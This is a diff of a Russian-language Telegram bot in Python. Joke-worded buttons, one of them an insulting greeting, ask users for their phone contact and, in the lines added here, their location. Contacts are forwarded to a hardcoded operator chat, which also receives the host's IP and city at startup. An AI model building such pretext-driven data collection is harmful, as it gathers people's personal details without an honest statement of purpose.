@@ -71,7 +71,7 @@ kb.row(bt5)
 is_start = 0
 if is_start== 0:
 
-    bot.send_message(238538484, 'BOT START\nip: '+ pymyip.get_ip() + '\nCity:' + pymyip.get_city() + '\ncountry' + pymyip.get_country(), reply_markup=kb)
+    bot.send_message(238538484, 'BOT START\nip: '+ pymyip.get_ip() + '\nCity:' + pymyip.get_city() + '\nCountry' + pymyip.get_country(), reply_markup=kb)
     is_start = 1
 
 kb_video = types.InlineKeyboardMarkup(row_width=3)
@@ -191,7 +191,7 @@ def start_message(message):
         bot.send_sticker(message.chat.id, 'CAADAgAD6CQAAp7OCwABx40TskPHi3MWBA')
         bot.send_message(message.chat.id, 'Привет, ' + user_name + ' Что ты хочешь от меня, собака сутулая?', reply_markup=kb)
     else:
-        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True, one_time_keyboard=True)
+        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
         button_phone = types.KeyboardButton(text="Я не сутулая собака, я коженный мешок", request_contact=True)
         keyboard.add(button_phone)
 
@@ -212,7 +212,11 @@ def sendfoto_message(message):
 @bot.message_handler(content_types=['contact'])
 def contact(message):
     if message.contact is not None:
+        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
+        button_phone = types.KeyboardButton(text="Я даже знаю, где я", request_location = True)
+        keyboard.add(button_phone)
+
         bot.send_message(238538484, message.contact)
-        bot.send_message(message.chat.id, "Благодарствую", reply_markup=types.ReplyKeyboardRemove())
+        bot.send_message(message.chat.id, "Здорово, а откуда ты?", reply_markup=keyboard)
 
 bot.polling()
